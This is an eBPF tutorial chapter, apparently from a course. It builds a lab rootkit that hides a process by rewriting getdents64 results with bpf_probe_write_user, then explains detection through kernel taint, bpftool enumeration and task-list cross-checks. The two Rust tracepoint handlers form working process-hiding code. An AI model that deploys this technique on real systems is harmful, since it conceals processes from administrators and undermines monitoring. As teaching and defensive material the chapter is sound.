---
title: "Hiding a process (lab-only offense)"
order: 39
part: Security & LSM
description: "Understand rootkit-style eBPF by building one in the lab: rewrite the getdents64 buffer with bpf_probe_write_user so a chosen PID vanishes from /proc — invisible to ps and ls — then learn exactly how a defender detects the tampering."
duration: 50 minutes
---

To defend against eBPF abuse you have to understand it, so this chapter
builds a small piece of offense in the lab: a program that **hides a
process**. The technique is the well-known eBPF "pidhide" — intercept the
`getdents64` syscall that lists a directory and edit its result buffer so a
chosen `/proc/<pid>` entry disappears. The process keeps running; it's just
erased from what `ps`, `top`, and `ls /proc` are allowed to see. Then we do
the more important half: **how you detect it**. This is lab-only by
construction — it uses a kernel-tainting helper and would make a real system
untrustworthy.

The code is in `examples/39-pidhide/`. `./demo.sh` there builds, deploys,
and runs it; its `README.md` covers what it does and how to drive it.

{% include excalidraw.html
   file="pidhide"
   alt="getdents64 in the kernel writes directory entries into a user buffer. An eBPF exit hook uses bpf_probe_write_user to splice out the target /proc/PID entry before ps or ls /proc reads it, so the entry is gone from userspace's view. The process still exists — it is edited out of what userspace is allowed to see. Defense: bpf_probe_write_user taints the kernel, and you can compare /proc against the real task list."
   caption="Figure 39.1 — The process still exists; it is edited out of what userspace can see" %}

## How process listing works — and how to break it

`ps` and `ls /proc` don't have a magic "list processes" call. They open
`/proc` and call **`getdents64`**, which fills a user buffer with a packed
array of `linux_dirent64` records — one per entry, each carrying its length
(`d_reclen`) and name (`d_name`). To walk the array you start at the buffer,
read `d_reclen`, jump that many bytes, and repeat until you've consumed the
returned byte count.

That self-describing chain is the weakness. If you can edit the buffer after
the kernel fills it but before userspace reads it, you can make an entry
vanish by **extending the previous entry's `d_reclen` to swallow it**: the
walker jumps straight over the hidden record and never sees it. eBPF can do
exactly that — read the syscall's return buffer and write to it with
`bpf_probe_write_user`.

## How the code works

Two tracepoints cooperate: one captures the buffer pointer on the way *in*,
the other rewrites it on the way *out*.

### Capturing the buffer (enter)

```rust
#[map] static BUFS: HashMap<u64, u64> = HashMap::with_max_entries(1024, 0);

#[tracepoint] // syscalls:sys_enter_getdents64
pub fn enter_getdents(ctx: TracePointContext) -> u32 {
    // args: fd(@16), struct linux_dirent64 *dirent(@24), count(@32)
    if let Ok(dirp) = unsafe { ctx.read_at::<u64>(24) } {
        let _ = BUFS.insert(&bpf_get_current_pid_tgid(), &dirp, 0);
    }
    0
}
```

We stash the user buffer address keyed by `pid_tgid`, so the exit handler —
which only sees the return value — knows where the records are.

### Splicing out the target (exit)

```rust
#[map] static TARGET: Array<[u8; 16]> = Array::with_max_entries(1, 0); // pid string, null-padded

#[tracepoint] // syscalls:sys_exit_getdents64
fn on_exit(ctx: &TracePointContext) -> Result<(), ()> {
    let ret: i64 = unsafe { ctx.read_at(16) }.map_err(|_| ())?;   // bytes written
    if ret <= 0 { return Ok(()); }
    let key = bpf_get_current_pid_tgid();
    let dirp = *unsafe { BUFS.get(&key) }.ok_or(())?;
    let _ = BUFS.remove(&key);
    let target = unsafe { TARGET.get(0) }.ok_or(())?;

    let total = ret as u64;
    let (mut bpos, mut prev) = (0u64, 0u64);
    for _ in 0..64 {                                  // bounded walk → verifier-safe
        if bpos >= total { break; }
        let addr = dirp + bpos;
        let reclen: u16 = unsafe { bpf_probe_read_user((addr + 16) as *const u16) }.map_err(|_| ())?;
        if reclen == 0 { break; }
        let mut name = [0u8; 16];
        let _ = unsafe { bpf_probe_read_user_str_bytes((addr + 19) as *const u8, &mut name) };
        if eq(&name, target) && prev != 0 {
            let prev_reclen: u16 = unsafe { bpf_probe_read_user((prev + 16) as *const u16) }.map_err(|_| ())?;
            let merged = prev_reclen + reclen;        // previous entry absorbs this one
            unsafe { bpf_probe_write_user((prev + 16) as *mut _, &merged as *const u16 as *const _, 2); }
            bump(&HIDES, 0, 1);
        }
        prev = addr;
        bpos += reclen as u64;
    }
    Ok(())
}
```

The load-bearing parts:

- A `linux_dirent64` record puts **`d_reclen` at offset 16** and the name at
  **offset 19**. We read both from the *user* buffer with
  `bpf_probe_read_user` (it's userspace memory, so the user reader), walking
  `bpos` forward by each `d_reclen`.
- The **bounded `for _ in 0..64`** is mandatory: the verifier rejects an
  unbounded walk. Sixty-four entries per call is plenty for `/proc`; you'd
  re-hide on the next `getdents64` if a listing were larger.
- When `d_name` matches the target PID string, we **rewrite the *previous*
  entry's `d_reclen`** to `prev_reclen + reclen` with `bpf_probe_write_user`.
  Now the walker skips the target. (If the target is the very first entry
  there's no previous to extend — a known edge case left unhandled here, and
  noted because real implementations special-case it.)
- **`bpf_probe_write_user` is the dangerous helper.** It writes into another
  process's memory from the kernel and **sets the kernel taint flag**
  (`TAINT_USER`) the first time it's used — which, as we'll see, is exactly
  how a defender notices.

The loader writes the PID-to-hide as a null-padded string into `TARGET` and
attaches both tracepoints; `HIDES` counts splices for an
`ebpf_proc_hidden_total` metric.

## Build, deploy, observe

```bash
cd examples/39-pidhide && ./demo.sh
```

The demo starts a `sleep` on the target, hides its PID, and then runs
`ps`/`ls /proc` in a loop. While the program is attached the PID is absent
from both, even though the process is alive and `kill -0 <pid>` succeeds;
detach and it reappears.

## Detecting it (the part that matters)

The whole reason to build this is to recognize it. Three signals, from
easiest to most thorough:

1. **The kernel is tainted.** `bpf_probe_write_user` trips `TAINT_USER`.
   `cat /proc/sys/kernel/tainted` becomes non-zero, and `dmesg` logs a
   one-time warning naming the writing process. On a hardened host that
   warning *is* the alert.
2. **A BPF program is loaded that shouldn't be.** `sudo bpftool prog show`
   lists tracepoint programs on `getdents64` — there's no legitimate reason
   for one, and `bpftool` (and your own monitoring) can enumerate every
   loaded program and its attach point.
3. **The data disagrees with itself.** The process exists by every channel
   that *doesn't* go through `getdents64`: `kill -0 <pid>` succeeds,
   `/proc/<pid>/` is directly statable, and a BPF **task iterator**
   (Chapter in Part 8) walking the kernel's real task list shows it. A
   monitor that compares "what `ls /proc` returned" with "what the task list
   actually contains" catches the discrepancy immediately.

The lesson cuts both ways: eBPF can hide things from userspace tools, and
eBPF (plus the kernel's own bookkeeping) is also the most reliable way to
catch that it happened.

**In Grafana** (`127.0.0.1:3000` → Explore), graph `rate(ebpf_proc_hidden_total[1m])` — getdents entries rewritten to hide the PID.

## What you learned

- **`getdents64` buffer rewriting** is how eBPF "rootkits" hide files and
  processes: splice an entry out by extending the previous record's
  `d_reclen` with `bpf_probe_write_user`.
- That helper is **kernel-tainting and lab-only** — using it is itself a
  detectable event.
- **Detection**: the taint flag, enumerating loaded BPF programs, and
  cross-checking userspace listings against the kernel's real task list.

Next, Chapter 40 turns to defense proper: using an LSM hook to **protect a
file from tampering**, even by root.

---

*Verification status: <span class="status status--verified">verified — Fedora 44, kernel 7.1.3</span>.
Built and run on the lab VM (Fedora 44, kernel 7.1.3-200.fc44): builds, loads, and attaches cleanly and runs without error. Confirmed on this kernel — attach targets and struct offsets can be version-specific.*
